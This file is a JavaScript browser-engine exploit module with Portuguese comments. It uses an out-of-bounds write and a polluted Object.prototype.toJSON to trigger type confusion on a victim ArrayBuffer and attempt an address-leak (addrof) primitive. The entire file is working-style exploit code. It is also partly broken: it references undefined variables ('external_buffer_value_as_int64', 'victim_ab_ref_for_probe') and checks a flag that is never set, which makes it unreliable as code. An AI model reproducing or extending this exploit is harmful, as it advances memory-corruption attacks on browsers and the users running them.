// js/script3/testArrayBufferVictimCrash.mjs (Sonda Agressiva com Leituras e Escritas)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "Heisenbug_AggressiveRWProbe_v1";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;
const CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG = 0x7C;

// Globais para a sonda e resultados
let victim_ab_ref_for_aggressive_probe = null;
let object_to_assign_aggressively = null; // Objeto que tentaremos escrever
let aggressive_rw_probe_details = {};    // Coleta todos os resultados da sonda

function AggressiveRWHeisenbugProbe() {
    const FNAME_PROBE = "AggressiveRWProbe";
    let current_this_type = Object.prototype.toString.call(this);
    
    // Inicializa/reseta os detalhes para ESTA chamada da sonda se for o nosso victim_ab
    // Se for outro objeto, não mexemos em aggressive_rw_probe_details.
    if (this === victim_ab_ref_for_aggressive_probe) {
        aggressive_rw_probe_details = {
            probe_variant: FNAME_PROBE,
            type_at_call_for_victim: current_this_type,
            heisenbug_active_for_rw: false,
            indexed_writes: {},
            named_writes: {},
            indexed_reads_after_write: {},
            named_reads_after_write: {},
            errors_in_rw: []
        };
        logS3(`[${FNAME_PROBE}] Iniciando para VICTIM_AB. Tipo inicial: ${current_this_type}`, "leak");

        if (current_this_type === '[object Object]') {
            aggressive_rw_probe_details.heisenbug_active_for_rw = true;
            logS3(`[${FNAME_PROBE}] HEISENBUG ATIVA PARA VICTIM_AB! Tipo: [object Object]. Iniciando R/W agressivo...`, "vuln");

            const obj_to_write = object_to_assign_aggressively;
            const indices_to_try = [0, 1, 2]; // Tentar escrever/ler nestes índices
            const prop_names_to_try = ["p0", "p1", "p2"]; // E nestas propriedades

            // Tentativas de Escrita Indexada
            for (const index of indices_to_try) {
                try {
                    this[index] = obj_to_write;
                    aggressive_rw_probe_details.indexed_writes[index] = "ASSIGNED_TARGET_OBJ";
                } catch (e) {
                    aggressive_rw_probe_details.indexed_writes[index] = `Error: ${e.name}`;
                    aggressive_rw_probe_details.errors_in_rw.push(`IdxWrite[${index}]: ${e.message}`);
                }
            }

            // Tentativas de Escrita Nomeada
            for (const propName of prop_names_to_try) {
                try {
                    this[propName] = obj_to_write;
                    aggressive_rw_probe_details.named_writes[propName] = "ASSIGNED_TARGET_OBJ";
                } catch (e) {
                    aggressive_rw_probe_details.named_writes[propName] = `Error: ${e.name}`;
                    aggressive_rw_probe_details.errors_in_rw.push(`NameWrite[${propName}]: ${e.message}`);
                }
            }
            logS3(`[${FNAME_PROBE}] Tentativas de escrita concluídas.`, "info");

            // Tentativas de Leitura Indexada (APÓS as escritas)
            for (const index of indices_to_try) {
                try {
                    const val = this[index];
                    aggressive_rw_probe_details.indexed_reads_after_write[index] = (val === obj_to_write) ? "MATCHED_TARGET_OBJ" : String(val);
                } catch (e) {
                    aggressive_rw_probe_details.indexed_reads_after_write[index] = `Error: ${e.name}`;
                }
            }

            // Tentativas de Leitura Nomeada (APÓS as escritas)
            for (const propName of prop_names_to_try) {
                try {
                    const val = this[propName];
                    aggressive_rw_probe_details.named_reads_after_write[propName] = (val === obj_to_write) ? "MATCHED_TARGET_OBJ" : String(val);
                } catch (e) {
                    aggressive_rw_probe_details.named_reads_after_write[propName] = `Error: ${e.name}`;
                }
            }
            logS3(`[${FNAME_PROBE}] Tentativas de leitura pós-escrita concluídas.`, "info");
        } else {
            logS3(`[${FNAME_PROBE}] Heisenbug NÃO ATIVA para victim_ab no momento. Tipo: ${current_this_type}`, "warn");
        }
    }
    // O toJSON_call_details_v28 global (para o runner) será uma cópia de aggressive_rw_probe_details se for o victim_ab
    // ou um objeto genérico se não for.
    if (this === victim_ab_ref_for_aggressive_probe) {
        toJSON_call_details_v28 = JSON.parse(JSON.stringify(aggressive_rw_probe_details)); // Salva uma cópia
        // Garante que this_type_in_toJSON reflita o tipo no final da interação com o victim_ab
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
    } else if (!toJSON_call_details_v28 || !toJSON_call_details_v28.probe_called_on_victim) {
        // Se toJSON_call_details_v28 não foi setado pelo victim_ab ainda,
        // preenche com informações desta chamada (que não é no victim_ab).
        toJSON_call_details_v28 = {
            probe_variant: FNAME_MODULE_V28 + "_NonVictimCall",
            this_type_in_toJSON: current_this_type,
            probe_called_on_victim: false
        };
    }


    return { 
        probe_run_aggressive_rw: true, 
        final_type_for_this_call: Object.prototype.toString.call(this) 
    };
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndRWExploit`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de R/W Agressivo via Heisenbug ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Resetar globais do módulo
    victim_ab_ref_for_aggressive_probe = null;
    object_to_assign_aggressively = { marker: Date.now() + 12, id: "AggressiveTargetV1" };
    aggressive_rw_probe_details = {}; 
    toJSON_call_details_v28 = null; // Para o runner

    let errorCapturedMain = null;
    let stringifyOutput = null; // Resultado do JSON.stringify
    let exploit_result = {
        success: false,
        heisenbug_confirmed_by_probe: false,
        buffer_altered_externally: false,
        external_buffer_value_int64: null,
        probe_details: null, // Cópia de aggressive_rw_probe_details
        message: "Exploração não iniciada."
    };
    
    const fillPattern = 0.1234567890123456; // Padrão para o buffer da vítima

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { 
            throw new Error("OOB Init falhou ou m_length de oob_dataview_real não foi expandido.");
        }
        logS3("Ambiente OOB inicializado e m_length expandido.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); 

        victim_ab_ref_for_aggressive_probe = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_aggressive_probe);
        float64_view_on_victim.fill(fillPattern);
        
        logS3(`PASSO 2: victim_ab (tam ${VICTIM_AB_SIZE}) criado, preenchido com ${fillPattern}. Tentando JSON.stringify com ${AggressiveRWHeisenbugProbe.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: AggressiveRWHeisenbugProbe,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            
            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_aggressive_probe)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_aggressive_probe); 
            logS3(`  JSON.stringify completou. Saída stringify: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // aggressive_rw_probe_details foi preenchido pela sonda se this === victim_ab_ref_for_aggressive_probe
            exploit_result.probe_details = JSON.parse(JSON.stringify(aggressive_rw_probe_details)); // Copia profunda
            logS3(`  Resultados DETALHADOS da Sonda Agressiva (aggressive_rw_probe_details): ${JSON.stringify(aggressive_rw_probe_details)}`, "leak", FNAME_CURRENT_TEST);

            exploit_result.heisenbug_confirmed_by_probe = (aggressive_rw_probe_details && aggressive_rw_probe_details.heisenbug_condition_met_for_reads === true);
            logS3(`  Heisenbug ATIVA durante R/W da sonda (conforme aggressive_rw_probe_details): ${exploit_result.heisenbug_confirmed_by_probe}`, exploit_result.heisenbug_confirmed_by_probe ? "vuln" : "warn", FNAME_CURRENT_TEST);

            if (exploit_result.heisenbug_confirmed_by_probe) {
                logS3("PASSO 3: Heisenbug confirmada pela sonda! Verificando buffer do victim_ab externamente...", "warn", FNAME_CURRENT_TEST);
                
                const value_read_double = float64_view_on_victim[0];
                exploit_result.buffer_altered_externally = (value_read_double !== fillPattern && value_read_double !== 0);
                logS3(`  Valor lido de float64_view_on_victim[0] (externo): ${value_read_double}. Buffer alterado: ${exploit_result.buffer_altered_externally}`, "leak", FNAME_CURRENT_TEST);

                if (exploit_result.buffer_altered_externally) {
                    const dbl_buf = new ArrayBuffer(8);
                    (new Float64Array(dbl_buf))[0] = value_read_double;
                    const int32_view = new Uint32Array(dbl_buf);
                    exploit_result.external_buffer_value_int64 = new AdvancedInt64(int32_view[0], int32_view[1]);
                    logS3(`  Buffer alterado! Lido externamente como Int64: ${exploit_result.external_buffer_value_int64.toString(true)}`, "vuln", FNAME_CURRENT_TEST);

                    // Checagem se o valor parece um ponteiro
                    if (exploit_result.external_buffer_value_int64.high() < 0x00020000 || (exploit_result.external_buffer_value_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                        exploit_result.success = true;
                        exploit_result.message = "SUCESSO! Heisenbug na sonda, R/W agressivo tentado, buffer alterado E valor parece ponteiro (ADDROF)!";
                        document.title = `${FNAME_MODULE_V28}: ADDROF! ${exploit_result.external_buffer_value_int64.toString(true)}`;
                    } else {
                        exploit_result.message = "Heisenbug na sonda, R/W agressivo tentado, buffer alterado, mas valor NÃO parece ponteiro.";
                        document.title = `${FNAME_MODULE_V28}: Buffer Escrito, Não Addr`;
                    }
                } else {
                    exploit_result.message = "Heisenbug confirmada pela sonda e R/W agressivo tentado, mas buffer NÃO foi alterado.";
                    document.title = `${FNAME_MODULE_V28}: TC OK, Buffer Inalterado`;
                }
            } else {
                exploit_result.message = `Heisenbug NÃO confirmada pela sonda no momento do R/W agressivo. Tipo obs. no victim: ${aggressive_rw_probe_details.type_at_call_for_victim || (toJSON_call_details_v28 ? toJSON_call_details_v28.this_type_in_toJSON : "N/A")}`;
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou na Sonda`;
            }
            logS3(`  ${exploit_result.message}`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        } catch (e_str) {
            errorCapturedMain = e_str;
            exploit_result.message = `ERRO CRÍTICO durante JSON.stringify: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        exploit_result.message = `ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Exploração Agressiva: Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Detalhes Completos da Sonda (aggressive_rw_probe_details): ${JSON.stringify(aggressive_rw_probe_details)}`, "leak", FNAME_CURRENT_TEST);
        if(exploit_result.external_buffer_value_int64){
            logS3(`  Valor Externo do Buffer (Int64): ${exploit_result.external_buffer_value_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        victim_ab_ref_for_probe = null;
        object_to_assign_aggressively = null;
        aggressive_rw_probe_details = {};
        toJSON_call_details_v28 = null;
    }
    
    return { 
        errorOccurred: errorCapturedMain, 
        toJSON_details: toJSON_call_details_v28, // Para o runner ter o último estado (pode ser de chamada não-vítima)
        exploit_attempt_result: exploit_result // Contém os resultados da exploração e aggressive_rw_probe_details
    };
}
